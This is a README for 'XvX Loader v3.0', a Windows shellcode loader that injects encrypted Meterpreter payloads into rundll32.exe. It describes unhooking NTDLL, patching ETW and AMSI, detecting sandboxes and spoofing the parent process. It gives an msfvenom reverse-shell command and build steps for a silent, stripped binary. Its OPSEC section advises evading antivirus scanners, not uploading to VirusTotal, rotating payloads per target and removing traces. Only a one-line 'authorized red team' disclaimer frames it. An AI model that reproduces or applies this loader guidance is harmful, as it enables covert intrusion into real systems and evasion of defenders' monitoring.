# XvX Loader v3.0

Windows shellcode loader with AES-256-CBC encryption and EDR/sandbox evasion techniques.

## What is it?

A loader that injects shellcode (like Meterpreter) into a legitimate Windows process (rundll32.exe) in stealth mode. 
Bypasses EDR by using direct syscalls and unhooking NTDLL.

## Architecture

```
loader_v3.c          - Main entry point
build.ps1            - Automated build script
tools/               - AES encryptor for payloads
modules/
  ├── crypto.c       - AES-256-CBC (encrypt/decrypt)
  ├── injection.c    - APC injection + PPID spoofing
  ├── unhooking.c    - Clean NTDLL restoration
  ├── etw_bypass.c   - Disable ETW telemetry
  ├── amsi_bypass.c  - Neutralize AMSI (anti-powershell)
  ├── sandbox_evasion.c - VM/sandbox detection
  └── syscalls.c     - Indirect syscalls (bypass hooks)
```

## Quick build

```powershell
# 1. Generate payload on Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 EXITFUNC=thread -f raw -o meterpreter.bin

# 2. Copy to payload/
# 3. Compile
.\build.ps1

# Result: output\Loader.exe (67 KB, silent, stripped)
```

## How it works

**Stage 1: Sandbox evasion**
- Check VM (VMware, VirtualBox, Hyper-V)
- Verify RAM/CPU/disk (sandboxes often have 2GB RAM, 2 CPUs)
- Uptime > 10 min (sandbox timeout usually 5 min)

**Stage 2: Unhooking**
- Load fresh copy of ntdll.dll from C:\Windows\System32
- Replace .text section in memory (where EDR hooks live)
- Flush instruction cache

**Stage 3: ETW/AMSI bypass**
- Patch EtwEventWrite (Windows telemetry)
- Patch AmsiScanBuffer if loaded

**Stage 4: Injection**
- Create rundll32.exe in suspended mode
- PPID spoofing to explorer.exe (looks legit)
- Allocate RWX memory with direct syscall
- Write shellcode
- APC on main thread
- Resume → shellcode executes

## Manual compilation

```powershell
# DEBUG (console visible, for testing)
gcc -O0 loader_v3.c modules\*.c modules\dosyscall.o -o Loader_DEBUG.exe -ladvapi32 -lntdll -luser32

# PROD (silent, optimized, stripped)
gcc -O2 -DPRODUCTION loader_v3.c modules\*.c modules\dosyscall.o -o Loader_PROD.exe -ladvapi32 -lntdll -luser32 -mwindows -s
```

## OPSEC

**Do:**
- Test on filescan.io or antiscan.me (NOT VirusTotal which shares with AVs)
- Change payload per target (rotate AES keys)
- Check connection: `netstat -ano | findstr <port>`
- Kill rundll32.exe process after use

**Don't:**
- Upload to VirusTotal (burns the signature)
- Reuse same binary on multiple targets
- Leave traces (payload.bin on disk)
- Default LHOST/LPORT (192.168.1.100:4444 = obvious)

## Detection

**What's mitigated:**
- Syscall strings obfuscated (SysAllocMem instead of NtAllocateVirtualMemory)
- No suspicious imports (everything via syscalls)
- ETW patched (no telemetry logs)
- EDR hooks bypassed

**What's still visible:**
- High entropy (AES-256 = random data)
- RWX memory allocation (required for shellcode)
- Injection behavior (detectable by advanced EDR)
- Orphan rundll32.exe process (no parameters)

## Known issues

If `dosyscall.o` missing after cleanup:
```powershell
cd modules
gcc -c dosyscall.S -o dosyscall.o
```

If loader gets killed by Kaspersky/Defender during testing:
- Add folder exclusion in AV
- Compile with `-DPRODUCTION` (disables printf that can trigger)

## Contact

28Zaakypro@proton.me

**Disclaimer:** Authorized red team / pentest only. Illegal use = your responsibility.
